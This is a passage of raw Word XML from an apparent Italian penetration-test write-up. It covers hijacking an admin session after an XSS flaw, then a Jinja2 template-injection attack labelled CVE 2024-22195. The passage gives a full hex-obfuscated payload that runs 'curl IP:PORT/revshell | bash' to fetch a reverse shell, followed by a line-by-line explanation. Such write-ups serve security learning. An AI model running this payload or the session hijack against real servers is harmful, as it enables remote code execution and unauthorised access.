    </w:p>
    <w:p w:rsidR="0C0A8751" w:rsidP="21040C4D" w:rsidRDefault="0C0A8751" w14:paraId="071F34E7" w14:textId="38978F01">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="0C0A8751">
        <w:rPr/>
        <w:t>A questo punto visto che abbiamo constato che un campo di input era vulnerabile a</w:t>
      </w:r>
      <w:r w:rsidR="54506AA5">
        <w:rPr/>
        <w:t>d attacchi di tipo XSS possiamo passare alla parte di exploit in cui andiamo ad utilizzare il token di sessione da amministratore per poter attaccare l’asset.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="3DE2A2F9" w:rsidP="21040C4D" w:rsidRDefault="3DE2A2F9" w14:paraId="329120D7" w14:textId="2B3AA307">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="3DE2A2F9">
        <w:rPr/>
        <w:t>GET /</w:t>
      </w:r>
      <w:r w:rsidR="3DE2A2F9">
        <w:rPr/>
        <w:t>session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zkwcjg.ntKJ</w:t>
      </w:r>
      <w:r w:rsidR="3DE2A2F9">
        <w:rPr/>
        <w:t>4zBLCtRSaeea-V5fijKrS_Q HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1585D635" w:rsidP="21040C4D" w:rsidRDefault="1585D635" w14:paraId="56ACFB67" w14:textId="42E2A409">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="1585D635">
        <w:rPr/>
        <w:t>L’</w:t>
      </w:r>
      <w:r w:rsidR="1585D635">
        <w:rPr/>
        <w:t>ouput</w:t>
      </w:r>
      <w:r w:rsidR="1585D635">
        <w:rPr/>
        <w:t xml:space="preserve"> dovrebbe </w:t>
      </w:r>
      <w:r w:rsidR="1585D635">
        <w:rPr/>
        <w:t>assomogliare</w:t>
      </w:r>
      <w:r w:rsidR="1585D635">
        <w:rPr/>
        <w:t xml:space="preserve"> a questo:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1585D635" w:rsidP="21040C4D" w:rsidRDefault="1585D635" w14:paraId="731A735A" w14:textId="309777C7">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="1585D635">
        <w:drawing>
          <wp:inline wp14:editId="58C85DE8" wp14:anchorId="4B94AC58">
            <wp:extent cx="5267324" cy="1352550"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3018440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ae43f04e554a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E2A2F9" w:rsidP="21040C4D" w:rsidRDefault="3DE2A2F9" w14:paraId="49D78F20" w14:textId="3FE60AD8">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="3DE2A2F9">
        <w:rPr/>
        <w:t>Lo andiamo ad inserire all’interno dei cookies di Firefox per ottenere la sessione da amministratore.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="093E3C0E" w:rsidP="21040C4D" w:rsidRDefault="093E3C0E" w14:paraId="37289FC3" w14:textId="29FE532D">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="093E3C0E">
        <w:drawing>
          <wp:inline wp14:editId="2CF67B7F" wp14:anchorId="4D15AB49">
            <wp:extent cx="5267324" cy="3533775"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1114085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346bf06cd44f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3E3C0E" w:rsidP="21040C4D" w:rsidRDefault="093E3C0E" w14:paraId="64201407" w14:textId="5DC1D72E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="093E3C0E">
        <w:rPr/>
        <w:t>Una volta impostato potremmo finalmente accedere a pagine nascosti agli utenti semplici come la pagina /dashboard</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="0757182C" w14:textId="19A2A9B2">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="23B65BB6" w:rsidP="21040C4D" w:rsidRDefault="23B65BB6" w14:paraId="22A56ECC" w14:textId="609291B0">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="23B65BB6">
        <w:drawing>
          <wp:inline wp14:editId="0ED86910" wp14:anchorId="218BE9F6">
            <wp:extent cx="5267324" cy="3781425"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="9134815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ea241461d043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DABC4E" w:rsidP="21040C4D" w:rsidRDefault="67DABC4E" w14:paraId="004FACE0" w14:textId="6D2BA213">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="67DABC4E">
        <w:rPr/>
        <w:t xml:space="preserve">Questa è una pagina accessibile solo ad admin e </w:t>
      </w:r>
      <w:r w:rsidR="770F4599">
        <w:rPr/>
        <w:t>quindi possiamo avere accesso a funzionalità più avanzate.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6C1C26C7" w:rsidP="21040C4D" w:rsidRDefault="6C1C26C7" w14:paraId="11DF869E" w14:textId="03E30147">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6C1C26C7">
        <w:rPr/>
        <w:t>Proviamo q</w:t>
      </w:r>
      <w:r w:rsidR="72DFB9C3">
        <w:rPr/>
        <w:t xml:space="preserve">uindi ad aprire le finestre per poter sfruttare qualche </w:t>
      </w:r>
      <w:r w:rsidR="1607CA05">
        <w:rPr/>
        <w:t>funzionalità.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="1240081C" w14:textId="1237C59D">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="6C1C26C7" w:rsidP="21040C4D" w:rsidRDefault="6C1C26C7" w14:paraId="527A454E" w14:textId="175A4E56">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6C1C26C7">
        <w:drawing>
          <wp:inline wp14:editId="733D384E" wp14:anchorId="6278E778">
            <wp:extent cx="5267324" cy="3419494"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1034173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0d1502135f44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4774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41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1A20AC" w:rsidP="21040C4D" w:rsidRDefault="691A20AC" w14:paraId="3016F829" w14:textId="35787850">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="691A20AC">
        <w:rPr/>
        <w:t xml:space="preserve">Compiliamo questi campi con valori a caso e generiamo un </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="691A20AC">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>Invoice</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="691A20AC" w:rsidP="21040C4D" w:rsidRDefault="691A20AC" w14:paraId="262B76C2" w14:textId="3CC2CB93">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="691A20AC">
        <w:drawing>
          <wp:inline wp14:editId="791C8944" wp14:anchorId="6A0F460E">
            <wp:extent cx="5267324" cy="3429000"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1079501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2367ac1a284a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1A20AC" w:rsidP="21040C4D" w:rsidRDefault="691A20AC" w14:paraId="7C4E9A9D" w14:textId="441C1C75">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="691A20AC">
        <w:rPr/>
        <w:t xml:space="preserve">Otteniamo così l’ID dell’ </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="691A20AC">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>Invoice</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="691A20AC" w:rsidP="21040C4D" w:rsidRDefault="691A20AC" w14:paraId="267AEA1D" w14:textId="47D47663">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="691A20AC">
        <w:drawing>
          <wp:inline wp14:editId="75793D84" wp14:anchorId="370424C6">
            <wp:extent cx="5267324" cy="2600325"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="14644725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dd4b5cbc0f4c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1A20AC" w:rsidP="21040C4D" w:rsidRDefault="691A20AC" w14:paraId="1E9FC387" w14:textId="3B23F610">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="691A20AC">
        <w:rPr/>
        <w:t xml:space="preserve">Abbiamo ottenuto un </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="691A20AC">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>Invoice</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="691A20AC">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID</w:t>
      </w:r>
      <w:r w:rsidR="691A20AC">
        <w:rPr/>
        <w:t>. Ora andiamo ad analizzarlo.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1F895182" w:rsidP="21040C4D" w:rsidRDefault="1F895182" w14:paraId="5177E557" w14:textId="3043F9D1">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="1F895182">
        <w:drawing>
          <wp:inline wp14:editId="3B7569D9" wp14:anchorId="0877DD49">
            <wp:extent cx="5267324" cy="2524125"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1400322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07454a28a24e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895182" w:rsidP="21040C4D" w:rsidRDefault="1F895182" w14:paraId="1DCC497A" w14:textId="3A5C9AB4">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="1F895182">
        <w:rPr/>
        <w:t>Andiamo ora nella pagina della generazione del QR Code ed inseriamo l’ID otten</w:t>
      </w:r>
      <w:r w:rsidR="1DCC85AC">
        <w:rPr/>
        <w:t>uto precedentemente</w:t>
      </w:r>
      <w:r w:rsidR="1F895182">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7417998E" w:rsidP="21040C4D" w:rsidRDefault="7417998E" w14:paraId="6F150252" w14:textId="3F87A480">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="7417998E">
        <w:rPr/>
        <w:t xml:space="preserve">Aver generato il QR code ci porta ad una nuova pagina in cui possiamo trovare </w:t>
      </w:r>
      <w:r w:rsidR="5FF540DB">
        <w:rPr/>
        <w:t>un'altra</w:t>
      </w:r>
      <w:r w:rsidR="7417998E">
        <w:rPr/>
        <w:t xml:space="preserve"> casella di testo in cui possiamo andare ad inserire del codice</w:t>
      </w:r>
      <w:r w:rsidR="4E377C05">
        <w:rPr/>
        <w:t xml:space="preserve"> JavaScript per effettuare un altro attacco di tipo XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7417998E" w:rsidP="21040C4D" w:rsidRDefault="7417998E" w14:paraId="1ACA78FC" w14:textId="4D79BB06">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="7417998E">
        <w:drawing>
          <wp:inline wp14:editId="6A446FE7" wp14:anchorId="5BA204A4">
            <wp:extent cx="5267324" cy="2552700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16396189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632285c13942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CDDB6B" w:rsidP="21040C4D" w:rsidRDefault="33CDDB6B" w14:paraId="2E02B08B" w14:textId="7E14AE5E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="33CDDB6B">
        <w:rPr/>
        <w:t xml:space="preserve">A questo punto il nostro obiettivo diventa quello di ottenere una </w:t>
      </w:r>
      <w:r w:rsidR="33CDDB6B">
        <w:rPr/>
        <w:t>RevesrShell</w:t>
      </w:r>
      <w:r w:rsidR="33CDDB6B">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6110D22A" w:rsidP="21040C4D" w:rsidRDefault="6110D22A" w14:paraId="40211C37" w14:textId="2AC17AC8">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6110D22A">
        <w:drawing>
          <wp:inline wp14:editId="5A9B9603" wp14:anchorId="125A82A0">
            <wp:extent cx="5267324" cy="3457575"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="268448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a720ead3e846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0C0352" w:rsidP="21040C4D" w:rsidRDefault="290C0352" w14:paraId="08633231" w14:textId="6382A146">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1121636994" w:id="69378477"/>
      <w:r w:rsidR="290C0352">
        <w:rPr/>
        <w:t xml:space="preserve">CVE </w:t>
      </w:r>
      <w:r w:rsidR="03243EE8">
        <w:rPr/>
        <w:t>2024-22195</w:t>
      </w:r>
      <w:bookmarkEnd w:id="69378477"/>
    </w:p>
    <w:p w:rsidR="6110D22A" w:rsidP="21040C4D" w:rsidRDefault="6110D22A" w14:paraId="7CB06050" w14:textId="23A84276">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6110D22A">
        <w:rPr/>
        <w:t xml:space="preserve">Aprendo </w:t>
      </w:r>
      <w:r w:rsidR="6110D22A">
        <w:rPr/>
        <w:t>Burpsuite</w:t>
      </w:r>
      <w:r w:rsidR="6110D22A">
        <w:rPr/>
        <w:t xml:space="preserve"> andiamo a modificare </w:t>
      </w:r>
      <w:r w:rsidR="5A99956F">
        <w:rPr/>
        <w:t xml:space="preserve">un attributo per iniettare il nostro codice JavaScript. Esso però dovrà essere completato in quanto non ci apre una </w:t>
      </w:r>
      <w:r w:rsidR="5A99956F">
        <w:rPr/>
        <w:t>ReverseShell</w:t>
      </w:r>
      <w:r w:rsidR="5A99956F">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t xml:space="preserve">ma ci permette di eseguire comandi </w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t>arbitrari</w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t xml:space="preserve"> sulla macchina target.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="55D7858C" w:rsidP="21040C4D" w:rsidRDefault="55D7858C" w14:paraId="41D9E477" w14:textId="30DA2189">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t xml:space="preserve">Il </w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t>codice</w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t>questione</w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t xml:space="preserve"> è il </w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t>seguente</w:t>
      </w:r>
      <w:r w:rsidR="55D7858C">
        <w:rPr/>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>{{</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>request|attr</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>application</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")|</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>attr</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("\x5f\x5fglobals\x5f\x5f</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")|</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>attr</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("\x5f\x5fgetitem\x5f\x5f</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")(</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>"\x5f\x5fbuiltins\x5f\x5f</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")|</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>attr</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("\x5f\x5fgetitem\x5f\x5f</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")(</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>"\x5f\x5fimport\x5f\x5f</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")(</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>"os</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")|</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>attr</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>popen</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")(</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>IP:PORT</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>revshell</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")|</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>attr</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>read</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>")(</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="681E74BA">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>)}}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="28B95566" w14:textId="44BA1721">
      <w:pPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
      </w:pP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>Questo codice utilizza una tecnica avanzata per eseguire del codice arbitrario all'interno di un'applicazione Python. Vediamo nel dettaglio cosa fa ogni parte del codice:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="250D2CD9" w14:textId="7505CD93">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pP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{{ ...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 xml:space="preserve"> }}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 xml:space="preserve">: Questa è una sintassi utilizzata nei template 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>engines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 xml:space="preserve"> come Jinja2 per eseguire codice Python all'interno di template HTML.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="382A3FB9" w14:textId="3F89E0D5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pP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request|attr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("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application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")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 xml:space="preserve">: Ottiene l'attributo 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>application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 xml:space="preserve"> dall'oggetto request. Questo di solito si riferisce all'applicazione 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 xml:space="preserve">WSGI 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>in esecuzione.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="020B11FE" w14:textId="29A24E12">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pP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attr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("__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globals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__")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>: Ottiene l'attributo __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>globals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 xml:space="preserve">__ dell'oggetto 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>application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>. Questo fornisce accesso agli oggetti globali dell'applicazione.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="38DD43A9" w14:textId="7F3964EF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pP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attr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("__getitem__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")(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"__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builtins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__")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>: Ottiene l'elemento __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>builtins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>__ dal dizionario globale. __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>builtins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>__ contiene tutti i built-in di Python come funzioni e moduli di base.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="32D11352" w14:textId="11EE7189">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="240" w:beforeAutospacing="off" w:after="240" w:afterAutospacing="off"/>
        <w:rPr>
          <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="Constantia" w:cs="Constantia"/>
          <w:noProof w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pP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attr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("__getitem__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")(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"__import__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")(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"os"):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 xml:space="preserve"> Utilizza la funzione __import__ per importare il modulo os.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1CBEC19C" w:rsidP="21040C4D" w:rsidRDefault="1CBEC19C" w14:paraId="156BDA24" w14:textId="58B05C40">
      <w:pPr>
